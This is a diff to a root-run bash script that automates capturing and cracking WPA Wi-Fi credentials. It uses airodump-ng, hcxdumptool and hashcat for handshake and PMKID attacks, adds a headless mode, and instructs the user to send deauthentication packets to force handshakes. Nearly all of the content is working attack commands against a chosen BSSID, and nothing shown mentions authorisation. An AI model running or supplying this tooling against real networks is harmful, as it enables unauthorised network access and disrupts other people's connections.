@@ -1,6 +1,7 @@
 #!bin/bash
 # Run with root privileges.
 method=${method:-"4_way_handshake_aircrack"}
+mode=${headless:-0}
 wn_interface=${wn_interface:-"not_specified"}
 target_bssid=${target_bssid:-"not_specified"}
 channel=${channel:-"not_specified"}
@@ -32,19 +33,31 @@ if [[ $method == "4_way_handshake_aircrack" ]]; then
   wn_interface_monitor=${wn_interface}mon
 
   if [[ $target_bssid == "not_specified" ]] || [[ $channel == "not_specified" ]]; then
-    echo "Starting airodump-ng on ${wn_interface_monitor}."
+    if [[ $mode == 0 ]]; then
+      echo "Starting airodump-ng on ${wn_interface_monitor}."
 
-    xterm -title "airodump-ng monitor" -e airodump-ng $wn_interface_monitor &
-    read -p "Type BSSID: " target_bssid
+      xterm -title "airodump-ng monitor" -e airodump-ng $wn_interface_monitor &
+      read -p "Type BSSID: " target_bssid
 
-    read -p "Type channel: " channel
+      read -p "Type channel: " channel
 
-    killall xterm
+      killall xterm
+    else
+      read -p "Type BSSID: " target_bssid
+
+      read -p "Type channel: " channel
+    fi
   fi
 
-  xterm -title "airodump-ng on ${target_bssid}" -e airodump-ng --bssid $target_bssid -c $channel --write $capture_file_name $wn_interface_monitor &
+  if [[ $mode == 0 ]]; then
+    xterm -title "airodump-ng on ${target_bssid}" -e airodump-ng --bssid $target_bssid -c $channel --write $capture_file_name $wn_interface_monitor &
 
-  echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Look on the second terminal if you see :WPA handshake: (right top coner) you are golden."
+    echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Look on the second terminal if you see :WPA handshake: (right top coner) you are golden."
+  else
+    airodump-ng -K 1 --bssid $target_bssid -c $channel --write $capture_file_name $wn_interface_monitor &
+
+    echo "In order to keep level of network jamming at minimum you will send deauth signal by hand. Typically 3-5 packets is enough. Check ${capture_file_name} if it doesn't have handshake, try again."
+  fi
 
   continue_loop=true
 
@@ -59,7 +72,10 @@ if [[ $method == "4_way_handshake_aircrack" ]]; then
     "q")
       echo "Quitting..."
 
-      killall xterm
+      if [[ $mode == 0 ]]; then
+        killall xterm
+      fi
+
       continue_loop=false
       ;;
     *)
@@ -79,15 +95,17 @@ elif [[ $method == "4_way_handshake_hashcat" ]]; then
 
   wn_interface_monitor=${wn_interface}mon
 
-  echo -e "Following tools are required: \n - hcxdumptool v6.0.0 or higher \n - hcxpcapngtool from hcxtools v6.0.0 or higher\n - hashcat v6.0.0 or higher"
-
   if [[ $target_bssid == "not_specified" ]]; then
-    echo "Starting hashcat reacon scan on ${wn_interface_monitor}."
+    if [[ $mode == 0 ]]; then
+      echo "Starting hashcat reacon scan on ${wn_interface_monitor}."
 
-    xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface_monitor --do_rcascan &
-    read -p "Type BSSID: " target_bssid
+      xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface_monitor --do_rcascan &
+      read -p "Type BSSID: " target_bssid
 
-    killall xterm
+      killall xterm
+    else
+      read -p "Type BSSID: " target_bssid
+    fi
   fi
 
   systemctl stop NetworkManager.service
@@ -121,12 +139,17 @@ elif [[ $method == "pmkid_hashcat" ]]; then
   wn_interface_monitor=${wn_interface}mon
 
   if [[ $target_bssid == "not_specified" ]]; then
-    echo "Starting hashcat reacon scan on ${wn_interface_monitor}."
+    if [[ $mode == 0 ]]; then
+      echo "Starting hashcat reacon scan on ${wn_interface_monitor}."
 
-    xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface_monitor --do_rcascan &
-    read -p "Type BSSID: " target_bssid
+      xterm -title "hcxdumptool rcascan" -e hcxdumptool -i $wn_interface_monitor --do_rcascan &
+      read -p "Type BSSID: " target_bssid
 
-    killall xterm
+      killall xterm
+    else
+      read -p "Type BSSID: " target_bssid
+
+    fi
   fi
 
   systemctl stop NetworkManager.service
@@ -158,6 +181,6 @@ elif [[ $method == "pmkid_hashcat" ]]; then
   echo "Done."
 else
   echo "Sorry."
-  
+
   echo "Selected ${method} method is not recognised."
 fi
